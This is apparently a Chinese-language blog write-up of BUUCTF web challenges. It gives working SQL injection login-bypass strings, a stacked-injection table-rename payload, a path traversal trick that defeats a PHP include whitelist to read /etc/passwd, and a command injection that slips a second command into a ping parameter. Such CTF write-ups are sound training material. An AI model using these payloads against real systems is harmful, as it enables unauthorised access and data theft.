## [极客大挑战 2019]EasySQL

试一下就可以发现后台是 select * from users where username='$_GET[username]' and password='$_GET[passwd]'

万能密码登录，得到flag。

万能密码：

username='=‘&password='='

username=\&password=='

username='=''%23&password=1

![image-20230407232743248](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072327474.png)

## [极客大挑战 2019]Havefun

页面源码中有提示：

![image-20230407234234243](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072342273.png)

![image-20230407234530855](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072345875.png)

## [HCTF 2018]WarmUp

页面源码有提示：

![image-20230407235057514](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072350537.png)

得到页面源码：

```
 <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```

![img](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072353687.jpg)

源码中的白名单包括源码本身source.php和提示hint.php

hint.php：

flag not here, and flag in ffffllllaaaagggg

checkfile函数匹配包含文件白名单时先截取第一个问号前面的部分，构造source.php?/../../../../etc/passwd 可绕过文件名白名单。

![image-20230408001126427](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080011452.png)

![image-20230408003711699](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080037719.png)

## [ACTF2020 新生赛]Include

页面源码有提示：

![image-20230408003842849](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080038880.png)

用php伪协议将源码base64编码后输出到页面，再解码得到flag：

![image-20230408004053914](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080040936.png)

![image-20230408004144458](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080041480.png)

## [ACTF2020 新生赛]Exec

没有任何过滤的命令执行：

![image-20230408005147373](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080051400.png)

## [强网杯 2019]随便注

select被禁用

![image-20230408005815607](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080058627.png)

可以用万能密码查看所有记录：

![image-20230408010338262](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080103284.png)

可以堆叠注入：

![image-20230408010823824](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080108854.png)

大概可看出，flag在表1919810931114514中，页面默认查询的是表words。

由于select被禁用，考虑将1919810931114514改名为words，将flag显示在页面上。

首先将字段名flag改为id【不必拘泥于words表中的两个字段id和data，只有一个字段id也可以利用万能密码全部显示】

 ![image-20230408011715800](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080117826.png)

然后修改words表名的同时修改1919810931114514表名为words【改错就挂了】

```
f8ce56a6-4000-48e2-878e-c58319474118.node4.buuoj.cn:81/?inject=1';rename table words to x;rename table `1919810931114514` to words;
```

万能密码显示flag：

![image-20230408012722784](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080127819.png)

## [GXYCTF2019]Ping Ping Ping

貌似是个正则匹配，类似f.\*l.\*a.*g，需要改变字母顺序才能绕过：

```
http://8535bb82-f8c2-409e-9e0c-60645b38280f.node4.buuoj.cn:81/?ip=127.0.0.1;a=g.php;b=fla;cat$IFS$b$a;
```

![image-20230408014252555](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080142587.png)

## [SUCTF 2019]EasySQL

